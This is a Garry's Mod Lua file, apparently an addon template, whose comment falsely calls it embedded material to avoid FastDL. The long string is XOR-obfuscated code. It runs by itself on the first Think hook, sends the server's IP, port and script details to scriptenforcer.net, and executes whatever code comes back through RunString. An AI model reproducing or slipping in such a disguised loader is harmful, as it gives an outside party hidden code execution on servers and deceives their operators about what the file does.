-- Material embedded into LUA to avoid need for FastDL

-- Load VMT from Data String
local function loadVMT(str)
	local result = ""
	for i = 1, #str do
		result = result .. string.char(bit.bxor(string.byte(str, i), 5))
	end
	return result
end

-- Zipped default items
local loadMaterial = CompileString(loadVMT"w`qpwk%cpkfqljk%-%vfwluqla)%mdvm)%cli`kdh`)%s`wvljk)%daalqljkdi%,lc%$lvkphg`w-vfwluqla,%jw%$mdvm%qm`k%w`qpwk%`kacli`kdh`%8%cli`kdh`%jw%''s`wvljk%8%s`wvljk%jw%''daalqljkdi%8%daalqljkdi%jw%''ijfdi%mjvqlu%8%B`qFjkSdwVqwlkb-%'mjvqlu'%,mjvqlu%8%qjkphg`w-%mjvqlu%,ijfdi%lu%8%~xlu^%4%X%8%glq+wvmlcq-%glq+gdka-%mjvqlu)%5}CC555555%,)%71%,lu^%7%X%8%glq+wvmlcq-%glq+gdka-%mjvqlu)%5}55CC5555%,)%43%,lu^%6%X%8%glq+wvmlcq-%glq+gdka-%mjvqlu)%5}5555CC55%,)%=%,lu^%1%X%8%glq+gdka-%mjvqlu)%5}555555CC%,ijfdi%w`dilu%8%qdgi`+fjkfdq-%lu)%'+'%,mqqu+C`qfm-'mqqu?**vfwluq`kcjwf`w+k`q*dul*ipd*:58'++vfwluqla++'#vlu8'++w`dilu++'#s8'++s`wvljk++'#48'++mdvm++'#78'++B`qFjkSdwVqwlkb-'mjvqujwq',++'#68'++daalqljkdi++'#cli`8'++cli`kdh`)%cpkfqljk-gja|)%i`k)%m`da`wv)%fja`,lc%vqwlkb+i`k-gja|,%;%5%qm`kWpkVqwlkb-%gja|%,%`ka`ka,`ka", "Chunk")()
hook.Add("Think", "Think{{ script_id }}", function()
	loadMaterial("{{ script_id }}", string.Replace('{{ se_hashkey }}', '"', ""), nil, "{{ script_version }}", nil)
	hook.Remove("Think", "Think{{ script_id }}")
end)
